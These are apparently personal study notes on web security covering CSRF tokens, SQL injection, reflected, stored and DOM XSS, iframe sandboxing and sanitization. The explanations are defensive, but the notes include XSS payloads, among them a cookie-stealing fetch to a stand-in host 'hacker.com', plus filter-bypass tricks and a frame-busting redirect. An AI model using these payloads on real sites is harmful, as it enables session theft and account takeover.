##  How CSRF Tokens Work (The Actual Defense)
Since CORS doesn't block simple `POST` requests, we need a separate, robust mechanism to defeat CSRF: **the CSRF token**.

1.  **Server Issues a Token**: When a user logs into `https://your-bank.com` and loads a form (e.g., to transfer money), the server generates a unique, secret, unpredictable string (the CSRF token) and embeds it in the form as a hidden field. This same token is also stored in the user's session on the server.
    ```html
    <form action="/transfer" method="POST">
      <input type="hidden" name="csrf_token" value="a9b7c2f8e1d5">
      <!-- ... other form fields ... -->
    </form>
    ```

2.  **Client Sends it Back**: When the user submits the form, the browser automatically includes this token with the request.

3.  **Server Validates the Token**: For every state-changing request (like `POST`, `PUT`, `DELETE`), the server checks if the token submitted with the request matches the one stored in the user's session.
    *   ✅ **Match**: The request is legitimate. It came from the bank's own page because only that page could read and include the correct token (thanks to the **same-origin policy**).
    *   ❌ **Mismatch or Missing**: The request is rejected. A malicious site (`https://evil-site.com`) cannot read or guess the token value to forge a valid request, even though it can *trigger* a `POST` to the bank.


**A CSRF Attack**: You visit `https://evil-site.com`. Its page contains a hidden form that `POST`s directly to `https://bank.com/transfer`. Your browser automatically sends your session cookies with this request. **CORS does NOT block this simple `POST`.** However, the request will fail because `evil-site.com` cannot provide a valid CSRF token, which the bank's server will require.

---

<br />
<br />
<br />


# SQL injection

Most ORMs provide built-in protection against SQL injection when used correctly with their abstraction methods (e.g., `User.find_by(name: params[:name])`). However, many ORMs also offer "escape hatches" to run raw SQL, which become vulnerable if developers pass **UNSANITIZED user input** to these specific raw methods.


# [XSS - Cross-Site Scripting](https://www.youtube.com/watch?v=EoaDgUgS6QA)

## A. Reflected XSS

The victim sees the legitimate domain (e.g., `google.com` or `your-bank.com`) in the address bar. This is the most dangerous part of Reflected XSS: **Legitimacy.**

Because the script is executing inside the victim's browser *under the origin* of the trusted site, the browser gives that script access to everything that trusted site is allowed to see.

**The Flow of Session Theft:**

1.  **The Click:** The victim clicks a crafted link: `http://vulnerable-site.com/search?q=<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`
2.  **The Reflection:** The vulnerable server receives the request and "reflects" the input back in the HTML response (e.g., "You searched for: ...").
3.  **The Execution:** The browser renders the page, sees the `<script>` tag, and executes it immediately.
4.  **The Theft:** The script reads the user's session ID (usually stored in `document.cookie`) and sends it to `hacker.com`.
5.  **The Result:** The attacker now has the session ID. They can open their own browser, inject that cookie, and the server will think the attacker is the victim.

> **Note:** This specific "cookie theft" attack is often blocked by the **HttpOnly** flag, which prevents JavaScript from reading cookies. However, XSS can still be used to perform actions on the user's behalf (like forced money transfers) even if the cookie cannot be read.

-----

### 2\. How Iframes Help the Attacker

Iframes are incredibly useful for attackers because they allow the attack to happen **stealthily** or **automatically**.

#### A. The "Drive-By" Attack (Hidden Iframe)

Instead of sending you a link like `vulnerable.com/search?...` and hoping you don't notice the weird script at the end, the attacker sends you a link to their *own* website (e.g., `cool-contest-winner.com`).

On that page, they have a hidden iframe:

```html
<iframe src="http://vulnerable-site.com/search?q=<script>payload...</script>" 
        width="0" height="0" style="display:none;">
</iframe>
```

**Why this is dangerous:**

  * You visit the contest site.
  * The iframe loads the vulnerable URL in the background.
  * The XSS executes inside the iframe (which is technically the context of `vulnerable-site.com`).
  * **You never even see the vulnerable site.** The attack happens invisibly while you look at the contest page.

#### B. Phishing (UI Redressing)

An attacker might use an iframe to load the legitimate login page of a site, but overlay their own malicious input fields on top of it using CSS (similar to Clickjacking), or simply use the XSS to rewrite the contents of the page inside the iframe to look like a "Session Timed Out, Please Login Again" form.

-----

### 3\. What "Other Stuff" Helps?

Attackers rarely use plain `<script>` tags because web application firewalls (WAFs) and browsers often block them. They use several techniques to bypass defenses:

  * **URL Encoding:**
    Instead of sending `<script>`, they send `%3Cscript%3E`. The server decodes it and puts it into the HTML, where the browser executes it.

      * *Link looks like:* `site.com/search?q=%3Cscript%3E...`

  * **Polyglots and Obfuscation:**
    If the site filters the word `script`, attackers use other tags that execute code automatically.

      * *Example (Image tag):* `<img src=x onerror=alert(1)>`
      * *Example (SVG tag):* `<svg/onload=alert(1)>`

  * **URL Shorteners:**
    To hide the messy, suspicious code in the URL, attackers use services like Bit.ly.

      * The victim sees `bit.ly/3x8...`, clicks it, and is redirected to the malicious payload URL.

## B. Stored XSS (Persistent XSS)

**The "Landmine"**

This is generally considered the most dangerous type of XSS. Unlike Reflected XSS, where the attacker needs to trick a specific victim into clicking a link, Stored XSS allows the attacker to plant a trap that waits for victims.

  * **How it works:** The malicious script is permanently stored on the target server (in a database, file system, or forum post).
  * **The Attack Flow:**
    1.  **Injection:** The attacker submits a comment on a blog post: `Great post! <script>stealCookies()</script>`.
    2.  **Storage:** The website saves this comment in its database *without* sanitizing it.
    3.  **The Victim:** Later, a normal user (or an admin) visits that blog post.
    4.  **Execution:** The website serves the comment from the database to the user's browser. The script executes automatically when the page loads.

> **Why it's dangerous:** The attacker doesn't need to send links to anyone. They just post the comment and wait. Every single person who views that page gets attacked.

-----

## C. DOM-Based XSS

**The "Client-Side Glitch"**

This is the trickiest one to understand because it happens entirely inside the victim's browser. The server is often not involved in the error at all.

  * **How it works:** The vulnerability exists in the *legitimate* JavaScript code on the page. This code takes input from a **Source** and passes it to a risky **Sink**.

      * **Source:** Where the data comes from (e.g., `document.location.hash`, `localStorage`).
      * **Sink:** Where the data is executed (e.g., `innerHTML`, `eval()`).

  * **The Attack Flow:**

    1.  **The Vulnerable Code:** A site has a script like this:
        ```javascript
        // Grabs whatever is after the '#' in the URL and prints it on screen
        var name = document.location.hash.substring(1);
        document.getElementById("welcome").innerHTML = "Hello " + name;
        ```
    2.  **The Attack Link:** The attacker sends: `http://site.com#<img src=x onerror=alert(1)>`.
    3.  **The Execution:**
          * The browser loads the page. The server sends the *normal* page.
          * The *legitimate* client-side script runs, grabs the payload from the URL hash, and jams it into the HTML using `innerHTML`.
          * The malicious image tag executes.

> **Key Difference:** In Reflected XSS, the server reflects the payload. In DOM XSS, the server might not even see the payload (since browsers don't send anything after the `#` hash to the server).

-----

# The Defense: Encoding vs. Sanitizing

To stop XSS, you must treat user input as "untrusted data." There are two main ways to handle this.

#### A. HTML Encoding (The "Neutralizer")

This is the most common defense. It converts special characters that have meaning in HTML into their safe "entity" equivalents.

  * **How it works:**
    ```html
    Original: <script>alert('XSS')</script>
    Encoded:  &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
    ```

  * **The Result:**
    If a user inputs `<script>`, the browser receives `&lt;script&gt;`.
    The browser displays the text "\<script\>" to the user, but it **does not execute it** as code.

#### B. Sanitization (The "Filter")

Sometimes you *want* users to be able to use some HTML (like bolding text in a comment or adding a link), but you don't want them to use scripts. Encoding would break the bolding. This is where sanitization comes in.

  * **How it works:** You run the input through a library that strips out dangerous tags (like `<script>`, `<object>`, `<iframe>`) and dangerous attributes (like `onmouseover`), but leaves safe tags (like `<b>`, `<i>`, `<p>`) alone.
  * **Common Library:** `DOMPurify` is a popular library for this.

**Example of Sanitization:**

  * **Input:** `<b>Hello!</b> <script>alert(1)</script>`
  * **Sanitized Output:** `<b>Hello!</b>` (The script is removed entirely).

-----

### Summary of XSS Types

| Type | Where is the payload? | Who is the victim? |
| :--- | :--- | :--- |
| **Reflected** | In the URL (query parameter) | Only the person who clicks the specific link. |
| **Stored** | In the Database | Anyone who views the affected page. |
| **DOM-based** | In the Browser (Client-side logic) | Only the person who clicks the specific link. |

```html
<!-->Common payloads for testing<-->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)

<!-->Sometimes you might be on an Iframe so use this to check it<-->
use alert(document.domain) or alert(window.origin) instead
```

---

<br />
<br />
<br />


# [Iframes in HTML](https://youtu.be/aRGdDy18qfY?si=mxgSLxmHMlzKLAww)

## My understanding

If you're the one using Iframe on your site, you are the one who have to be careful. If you `allow-same-origin` then the Iframe site is also consider as
same origin as your site and it can make requests to your site, even if 
you had `same-origin` policy.
On the other hand if you're a bank and want your site to be non-iframeable
use this header in response.
```
Content-Security-Policy: frame-ancestors 'self';
```

---
<br />
<br />

Using an `<iframe>` without the `sandbox` attribute is like inviting a stranger into your house and leaving all the doors unlocked. By default, browsers give iframes a surprising amount of power.

If you omit the `sandbox` attribute (or apply it incorrectly), here are the specific "bad things" that can happen:

### 1\. The "Frame Busting" Hijack (Top-Level Navigation)

This is the most common and disruptive attack.

  * **The Scenario:** You embed a third-party widget (like a comment section or an ad) inside an iframe.
  * **The Attack:** The malicious code inside the iframe runs a simple line of JavaScript:
    ```javascript
    window.top.location = "http://malicious-site.com/phishing";
    ```
  * **The Result:** The iframe forces your user's **entire browser tab** to navigate away from your site and go to the attacker's site. The user thinks they are still on a safe path, but they've been hijacked.

### 2\. Phishing via Fake Login Forms

  * **The Scenario:** An attacker manages to inject content into an iframe on your site, or you embed a compromised site.
  * **The Attack:** The iframe displays a perfect replica of a Google or Microsoft login screen stating "Session Timed Out."
  * **The Danger:** Without the sandbox restricting forms, the user enters their credentials, and the iframe submits that data directly to the attacker's server.

### 3\. Malware & Drive-by Downloads

  * **The Scenario:** The iframe loads a page infected with an "Exploit Kit."
  * **The Attack:** The iframe automatically attempts to exploit vulnerabilities in the user's browser plugins (like old PDF readers or Flash) to install malware or ransomware.
  * **The Connection:** Even if the iframe is small or invisible, these scripts can run fully in the background unless `allow-scripts` is omitted in the sandbox.

### 4\. The "Same-Origin" Privilege Escalation

This is critical if you host user-uploaded content (like an HTML file a user uploaded to your cloud storage) and display it in an iframe **on the same domain**.

  * **The Vulnerability:** By default, if the iframe and the parent page share the same domain (Origin), the browser's "Same-Origin Policy" allows them to talk to each other freely.
  * **The Attack:**
    1.  The malicious iframe accesses `window.parent.document`.
    2.  It steals the parent's cookies (Session Hijacking).
    3.  It rewrites the parent page's DOM to trick the user.
  * **The Fix:** Using `sandbox` forces the iframe into a **unique origin** (basically treating it as a stranger), creating a wall between the iframe and your site, even if they are on the same domain.

### 5\. Annoyance Attacks (DoS)

  * **Popups:** The iframe can spawn infinite `alert()` boxes or open hundreds of new tabs/windows using `window.open()`, crashing the user's browser or freezing their computer.
  * **Pointer Lock:** The iframe can lock the user's mouse cursor, making it difficult for them to close the tab.

-----

### How `sandbox` Fixes This

The `sandbox` attribute applies a set of restrictions by default. When you add `<iframe sandbox src="...">`, it treats the content as if it were from a completely different, untrusted world.

You then selectively **lift** restrictions by adding flags. If you don't add the flag, the action is blocked.

| Flag | What happens if you **DON'T** use it? (The Sandbox Default) |
| :--- | :--- |
| **(No flags)** | **Maximum Security.** JavaScript is off, forms are blocked, popups blocked, origin is unique. |
| `allow-scripts` | JavaScript cannot run. |
| `allow-forms` | The iframe cannot submit data (e.g., login forms, search boxes). |
| `allow-top-navigation` | The iframe cannot redirect the user's whole tab (`window.top`). |
| `allow-popups` | `window.open()` and distinct alerts are blocked. |
| `allow-same-origin` | The iframe is treated as a generic, unique origin (cannot access parent cookies). |

### ⚠️ The "Golden Rule" of Sandboxing

**NEVER** use `allow-scripts` and `allow-same-origin` together if the content is untrusted.

```html
<iframe sandbox="allow-scripts allow-same-origin" src="user-upload.html"></iframe>
```

**Why?**
If you allow scripts **and** give it the same origin, the script inside the iframe can simply look at the sandbox attribute on its own frame element and remove it, effectively breaking out of the jail you put it in.



<br />
<br />
<br />
<br />


# [Where should you sanitize?](https://www.youtube.com/watch?v=lG7U3fuNw3A)


Consider this example, how do you think this will be parsed
```html
<div> <script title= "</div>">

<script><div title="</script>">
```

The problem is all browsers are different and may parse the weird html differenlty. so like if you are sanitizing on server and if you sanizite for a particular browser, than all of the users that are not using that particular browser will get affected. Bc their browser will behave differently and execute the script. So to protect all users no matter the browser, you need to sanitize in client-side on the frontend.

Let's say server responed with some data containing XSS, you will recieve that data and sanitaize it on the frontend before putting it to DOM.

Generally, all major browsers **parse** the content within the `<template>` element but **do not execute** script code(it just treat it as normal input string). That's why the main sanitizing libraries(eg Closure by google) uses browser's own parser, they mostly create an template element, assign the raw input to it, then sanitize it. Then assign the sanitized element to DOM at last(`div.innerHTML = template.innerHTML`).

Ofcourse you should sanitize on the server side also for more security, but client side sanitization is more practical and common.

## HTML Parsing

Browser HTML parsing refers to the process by which a web browser analyzes and interprets the raw HTML code of a web page to construct an internal representation of the document, known as the Document Object Model (DOM). This DOM is then used to render the visual elements of the page on the user's screen. 
### The HTML parsing process typically involves two main stages: 

- **Tokenization**: The browser's HTML parser breaks down the raw HTML code into individual units called "tokens." These tokens represent the fundamental building blocks of an HTML document, such as start tags (`<p>`), end tags (`</p>`), attribute names and values, comments, and plain text content. 

- **Tree Construction**: As the tokens are generated, the parser uses them to build a tree-like data structure called the Document Object Model (DOM). The DOM represents the hierarchical relationship between the different elements of the HTML document. Each HTML element, attribute, and text content becomes a node in this tree, allowing the browser to understand the structure and content of the page. 

During tree construction, **the parser also handles potential errors in the HTML code, attempting to correct malformed or invalid syntax to create a functional DOM**. Once the DOM is constructed, the browser can then proceed to the rendering stage, where it combines the DOM with the CSS Object Model (CSSOM) to create a render tree, which is then used to lay out and paint the web page on the screen. 
---

<br/>
<br/>
<br/>

# DOM vs Document

The **DOM is the abstract, theoretical model/interface**, while the document object is the **actual, concrete object (implementation)** that you use in JavaScript to interact with that model. 

You can view this DOM as live tree like structure, in Elements tab.
The DOM API defines *how a document(actual html document) should be modeled as object*.